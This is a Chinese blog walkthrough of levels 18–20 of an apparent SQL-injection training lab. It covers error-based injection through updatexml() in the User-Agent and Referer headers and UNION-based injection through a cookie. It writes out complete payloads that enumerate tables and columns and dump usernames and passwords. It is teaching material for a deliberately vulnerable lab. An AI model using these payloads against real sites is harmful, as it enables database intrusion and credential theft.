-&lt;h1 id=&#34;首先了解下updatexml函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#首先了解下updatexml函数&#34;&gt;#&lt;/a&gt; 首先了解下 updatexml () 函数&lt;/h1&gt;
-&lt;p&gt;PDATEXML (XML_document, XPath_string, new_value);&lt;/p&gt;
-&lt;p&gt;第一个参数：XML_document 是 String 格式，为 XML 文档对象的名称，文中为 Doc&lt;/p&gt;
-&lt;p&gt;第二个参数：XPath_string (Xpath 格式的字符串) ，如果不了解 Xpath 语法，可以在网上查找教程。&lt;/p&gt;
-&lt;p&gt;第三个参数：new_value，String 格式，替换查找到的符合条件的数据&lt;/p&gt;
-&lt;p&gt;作用：改变文档中符合条件的节点的值&lt;/p&gt;
-&lt;p&gt;改变 XML_document 中符合 XPATH_string 的值&lt;/p&gt;
-&lt;p&gt;而我们的注入语句为：&lt;/p&gt;
-&lt;p&gt;updatexml(1,concat(0x7e,(``SELECT &lt;code&gt; &lt;/code&gt; @@version),0x7e),1)&lt;/p&gt;
-&lt;p&gt;其中的 concat () 函数是将其连成一个字符串，因此不会符合 XPATH_string 的格式，从而出现格式错误，爆出&lt;/p&gt;
-&lt;p&gt;ERROR 1105 (HY000): XPATH syntax error: ``&#39;:root@localhost&#39;&lt;/p&gt;
-&lt;h1 id=&#34;开始做第十八关&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#开始做第十八关&#34;&gt;#&lt;/a&gt; 开始做第十八关&lt;/h1&gt;
-&lt;p&gt;打开第十八关发现网页显示了我们的 IP&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213738557-1229555793.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;先登录一下试试&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213734373-1416993883.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;登录后，网页显示了我们的 User Agent，可以猜测网页将我们的信息插入到数据库中，再返回到页面上。只有与数据库有交互，就有可能存在注入点，因此我们尝试修改 User Agent 字段。这里使用了 bp 抓包工具，先抓取一个登录成功的包&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213725052-1422925589.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;再发送到 repeater 里，方便修改数据测试&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213717550-1282837680.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;先发送一个正常的数据包&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213713647-604909032.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;可以看到返回正常我们将 UA 改成一个单引号重新发送&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213707926-1684541585.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这里出现了报错，很明显存在注入，这里是 insert 插入语句，所以我们用报错注入将 UA 改成&lt;/p&gt;
-&lt;p&gt;1&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#39;1&lt;/p&gt;
-&lt;h1 id=&#34;爆出数据库&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#爆出数据库&#34;&gt;#&lt;/a&gt; 爆出数据库&lt;/h1&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213653218-663027854.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;h1 id=&#34;接下来爆表&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#接下来爆表&#34;&gt;#&lt;/a&gt; 接下来爆表&lt;/h1&gt;
-&lt;p&gt;1&#39; and updatexml(1,concat(0x5e,(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;),1)),0x5e),1) and &#39;1&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213647696-1014400514.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;h1 id=&#34;接下来爆字段名&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#接下来爆字段名&#34;&gt;#&lt;/a&gt; 接下来爆字段名&lt;/h1&gt;
-&lt;p&gt;1&#39; and updatexml(1,concat(0x5e,(substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),1)),0x5e),1) and &#39;1&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213641430-437545893.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;h1 id=&#34;接下来爆字段上的信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#接下来爆字段上的信息&#34;&gt;#&lt;/a&gt; 接下来爆字段上的信息&lt;/h1&gt;
-&lt;p&gt;1&#39; and updatexml(1,concat(0x5e,(substr((select group_concat(username,0x7e,password) from users),1)),0x5e),1) and &#39;1&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213632981-778164895.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;第十九关是基于 Referer 的注入&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213619446-664759808.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;其余步骤详见第十八关&lt;/p&gt;
-&lt;h1 id=&#34;第二十关&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#第二十关&#34;&gt;#&lt;/a&gt; 第二十关&lt;/h1&gt;
-&lt;h2 id=&#34;什么是cookie注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#什么是cookie注入&#34;&gt;#&lt;/a&gt; 什么是 cookie 注入？&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzYxNzg2NTgzMQ==&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;cookie 注入的原理是：就是修改 cookie 的值进行注入（cookie 注入其原理也和平时的注入一样，只不过注入参数换成了 cookie）&lt;/p&gt;
-&lt;h2 id=&#34;2怎样cookie注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2怎样cookie注入&#34;&gt;#&lt;/a&gt; 2. 怎样 cookie 注入？&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzI4MjYzNzQ0NzA=&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;cookie 注入跟普通 sql 注入过程一样：&lt;/p&gt;
-&lt;p&gt;1. 判断是不是注入点&lt;/p&gt;
-&lt;p&gt;2. 得到字段总数&lt;/p&gt;
-&lt;p&gt;3. 查选表名&lt;/p&gt;
-&lt;p&gt;4. 查选列名&lt;/p&gt;
-&lt;p&gt;5. 脱库&lt;/p&gt;
-&lt;p&gt;发现如下，我们先用弱密码登录&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213607270-1849134554.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;登录成功发现&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213558449-1134427262.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;这里我们代码审计查看后台源码&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213534291-1431436633.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;可以看到注入点在 cookie 且为单引号闭合，又是 select * from 这里要用二分法猜字段。&lt;/p&gt;
-&lt;p&gt;我们抓包后将 Cookie 改成 1&#39;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213527669-960376843.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;报错这里用二分法查字段&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#报错这里用二分法查字段&#34;&gt;#&lt;/a&gt; 报错，这里用二分法查字段&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzQyNjM1Mzc4NA==&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213519073-2114535812.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;1&#39; order by 4# 时报错&lt;/p&gt;
-&lt;p&gt;联合查询 1&#39; union select 1,2,3#&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213509975-1599606389.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;23 位回显&lt;/p&gt;
-&lt;h2 id=&#34;爆数据库名和版本号&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#爆数据库名和版本号&#34;&gt;#&lt;/a&gt; 爆数据库名和版本号&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzQwNDA4NjQ0NDk=&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;1&#39; union select 1,database(),version()#&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213503579-1665802534.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;爆表名&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#爆表名&#34;&gt;#&lt;/a&gt; 爆表名&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzM1ODA1ODUxNA==&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;1&#39; union select 1,database(),(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)#&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213452986-238568021.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;爆字段名&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#爆字段名&#34;&gt;#&lt;/a&gt; 爆字段名&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzQyNDIzMjYxNTQ=&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;),(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)#&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213433398-945139268.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;爆字段上的信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#爆字段上的信息&#34;&gt;#&lt;/a&gt; 爆字段上的信息&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTFEtSm9rZXIvcC8xNjAwNDc0My5odG1sIzM4NzMxMTU3OTE=&#34;&gt;#&lt;/span&gt;&lt;/h2&gt;
-&lt;p&gt;1&#39; union select 1,(select group_concat(username) from users),(select group_concat(password) from users)#&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://img2022.cnblogs.com/blog/2793566/202203/2793566-20220314213423003-1053380243.png&#34; alt=&#34;img&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;完成注入&lt;/p&gt;
-&lt;p&gt;基础篇到此结束&lt;/p&gt;
 </content>
         <category term="Web" scheme="https://blog.xcu.icu/categories/Web/" />
         <category term="SQL注入" scheme="https://blog.xcu.icu/tags/SQL%E6%B3%A8%E5%85%A5/" />
